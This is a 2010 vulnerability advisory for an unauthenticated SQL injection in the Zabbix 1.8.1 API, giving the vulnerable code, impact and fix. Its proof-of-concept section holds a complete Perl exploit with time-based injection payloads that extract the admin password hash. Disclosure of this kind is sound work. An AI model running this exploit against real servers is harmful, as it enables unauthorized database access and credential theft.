@@ -1,0 +1,265 @@
+=============================================
+- Release date: April 1st, 2010
+- Discovered by: Dawid Golunski
+- Severity: High
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Zabbix <= 1.8.1 SQL Injection
+
+II. BACKGROUND
+-------------------------
+Zabbix is an enterprise-class open source distributed monitoring solution.
+Zabbix is software that monitors numerous parameters of a network and the
+health and integrity of servers. Properly configured, Zabbix can play an
+important role in monitoring IT infrastructure. This is equally true for
+small organisations with a few servers and for large companies with a
+multitude of servers.
+
+III. INTRODUCTION
+-------------------------
+Zabbix version 1.8 introduces an API which is vulnerable to an SQL Injection
+attack. No authentication required.
+
+IV. DESCRIPTION
+-------------------------
+
+Zabbix API uses a function called DBcondition() (definded in 
+include/db.inc.php) to format conditions in WHERE clause of an SQL query
+The function expects sanitized data and does not perform any additional
+checks:
+
+function DBcondition($fieldname, &$array, $notin=false, $string=false){
+	global $DB;
+	$condition = '';
+---[cut]---
+	$in =           $notin?' NOT IN ':' IN ';
+	$concat =       $notin?' AND ':' OR ';
+	$glue =         $string?"','":',';
+
+	switch($DB['TYPE']) {
+		case 'SQLITE3':
+		case 'MYSQL':
+		case 'POSTGRESQL':
+		case 'ORACLE':
+		default:
+			$items = array_chunk($array, 950);
+			foreach($items as $id => $values){
+				$condition.=!empty($condition)?')'.$concat.$fieldname.$in.'(':'';
+				if($string)     $condition.= "'".implode($glue,$values)."'";
+				else            $condition.= implode($glue,$values);
+			}
+			break;
+	}
+
+	if(zbx_empty($condition)) $condition = $string?"'-1'":'-1';
+
+return ' ('.$fieldname.$in.'('.$condition.')) ';
+}
+
+The DBcondition() is used numerous times within Zabbix API code to include
+user supplied parameters within SQL queries. It is also used during the
+authentication in class.cuser.php:
+
+class CUser extends CZBXAPI{
+---[cut]---
+public static function get($options=array()){
+---[cut]---
+// users
+if(!is_null($options['users'])){
+	zbx_value2array($options['users']);
+	$sql_parts['where'][] = DBcondition('u.alias', $options['users'], false, true);
+}
+
+---[cut]---
+if(!empty($sql_parts['where']))         $sql_where.= ' AND '.implode(' AND ',$sql_parts['where']);
+
+---[cut]---
+$sql = 'SELECT DISTINCT '.$sql_select.'
+                FROM '.$sql_from.'
+                WHERE '.DBin_node('u.userid', $nodeids).
+                $sql_where.
+                $sql_order;
+$res = DBselect($sql, $sql_limit);
+---[cut]---
+
+The $options['users'] variable can be supplied by calling the 
+user.authenticate method of the Zabbix API with a 'user' paramter as we
+can tell from rpc/class.czbxrpc.php file:
+
+// Authentication {{{
+if(($resource == 'user') && ($action == 'authenticate')){
+	$sessionid = null;
+
+	$options = array(
+			'users' => $params['user'],
+			'extendoutput' => 1,
+			'get_access' => 1
+			);
+	$users = CUser::get($options);
+	$user = reset($users);
+	if($user['api_access'] != GROUP_API_ACCESS_ENABLED){
+		self::$result = array('error' => ZBX_API_ERROR_NO_AUTH, 'data' => 'No API access');
+		return self::$result;
+}
+
+This lack of sanitization leads to an SQL Injection vulnerability which
+can be exploited without any authentication.
+
+V. PROOF OF CONCEPT
+-------------------------
+
+Below is a harmless PoC exploit that retrieves password hashes and checks
+for mysql root account.
+
+#!/usr/bin/perl
+
+#
+# zabbix181api.pl - Zabbix <= 1.8.1 API SQL Injection PoC Exploit
+#
+# Copyright (c) 2010 
+# Dawid Golunski <dawid[!]legalhackers.com>
+# legalhackers.com
+#
+# Description
+# -----------
+# A PoC exploit for Zabbix <= 1.8.1 API (api_jsonrpc.php) prone to
+# an sql injection attack allowing unauthenticated users to access 
+# the backend database.
+# The exploit performs a blind time-based sql injection attack to 
+# retrieve Zabbix Admin's password hash and check if Zabbix uses a
+# MySQL root account.
+#
+# Example
+# -----------
+# $ ./zabbix181api.pl http://10.0.0.1/zabbix
+# Target: http://10.0.0.1/zabbix
+# Reqtime: 0.2s ; SleepTime: 0.4s 
+# 
+# Checking if zabbix uses mysql root account... No
+#
+# Extracting Admin's password hash from zabbix users table:
+# 5fce1b3c34b520ageffb47ce08a7cd76
+# Job done.
+# 
+
+
+use Time::HiRes qw(gettimeofday tv_interval);
+use HTTP::Request::Common qw(POST);
+use LWP::UserAgent;
+
+my $zabbix_api_url = shift || die "No target url provided. Exiting.\n";
+$zabbix_api_url .= "/api_jsonrpc.php";
+my $ua = LWP::UserAgent->new;
+$ua->timeout(8);
+
+sub sendRequest 
+{
+	my ($api_url, $data) = @_;
+	my $start_time = [gettimeofday];
+	my $response = $ua->request(POST "$api_url", 
+		Content_Type => "application/json-rpc",
+		Content => "$data");
+	my $end_time = [gettimeofday];
+	my $elapsed_time = tv_interval($start_time,$end_time);
+	my $elapsed_time_sec = sprintf "%.1f", $elapsed_time;
+
+	my %result = ("content", $response->content, 
+		      "code", $response->code,
+		      "success", ($response->is_success() ? 1 : 0),
+		      "time", $elapsed_time_sec);
+	return %result;
+}
+
+%result  = sendRequest($zabbix_api_url, "");
+if ($result{success} ne 1) {
+	die "Could not access zabbix API.\n";
+}
+my $req_time = $result{time};
+my $sleep_time = ($req_time * 2.0);
+
+print "Target: $zabbix_api_url\n";
+print "Reqtime: ${req_time}s ; SleepTime: ${sleep_time}s \n\n";
+
+$| = 1;
+
+print "Checking if zabbix uses mysql root account... ";
+my $jsondata = '{"auth":null,"method":"user.authenticate","id":1,"params":{'.
+	       '"password":"apitest123",'.
+	       '"user":"Admin\') ) OR '.
+	       'if (!strcmp(substring(user(),1,4),\'root\'),sleep('.$sleep_time.'),0) '.
+	       ' -- end "},"jsonrpc":"2.0"}';
+%result = sendRequest($zabbix_api_url, $jsondata);
+print $result{content};
+if ($result{time}  >= $sleep_time) {
+	print "Yes!\n\n";
+} else {
+	print "No\n\n";
+}
+
+my $username = "Admin";
+my @chars = (0 .. 10, "a" .. "f");
+my $md5_hash = "";
+print "Extracting Admin's password hash from zabbix users table:\n";
+for (my $offset=1; $offset<=32; $offset++) {
+    for (my $idx=0; $idx<(scalar @chars); $idx++) {
+	$jsondata = '{"auth":null,"method":"user.authenticate","id":1,"params":{'.
+		       '"password":"apitest123",'.
+		       '"user":"'.$username.'\') ) AND '.
+		       'if (!strcmp(substring(u.passwd,'.$offset.',1),\''.$chars[$idx].'\'),sleep('.$sleep_time.'),0) '.
+		       ' -- end "},"jsonrpc":"2.0"}';
+	%result = sendRequest($zabbix_api_url, $jsondata);
+	if ($result{time}  >= $sleep_time) {
+		$md5_hash .= $chars[$idx];
+		print $chars[$idx];
+	} 
+    }
+}
+print "\nJob done.\n";
+
+
+VI. BUSINESS IMPACT
+-------------------------
+An attacker could exploit the vulnerability to retrieve any data from
+databases accessible by zabbix db user. 
+In case zabbix has been given a more privileged mysql account the 
+exploitation could go as far as code execution.
+
+Users running a vulnerable version of zabbix can become an easy 
+target as zabbix installation can be easily discovered if default
+settings are used by checking for a listening server on port 10051 and/or
+existence of api script at http://host/zabbix/api_jsonrpc.php
+
+VII. SYSTEMS AFFECTED
+-------------------------
+Versions 1.8 and 1.8.1 are vulnerable.
+Versions in line 1.7.x starting from 1.7.2 also contain the 
+api and could be vulnerable.
+
+VIII. SOLUTION
+-------------------------
+Upgrade to version 1.8.2 that has just come out or remove the API
+(api_jsonrpc.php) from your installation if not in use.
+
+IX. REFERENCES
+-------------------------
+http://www.zabbix.com
+http://legalhackers.com/advisories/zabbix181api-sql.txt
+http://legalhackers.com/poc/zabbix181api.pl-poc
+
+X. CREDITS
+-------------------------
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+
+XI. REVISION HISTORY
+-------------------------
+April 1st, 2010: Initial release
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with 
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
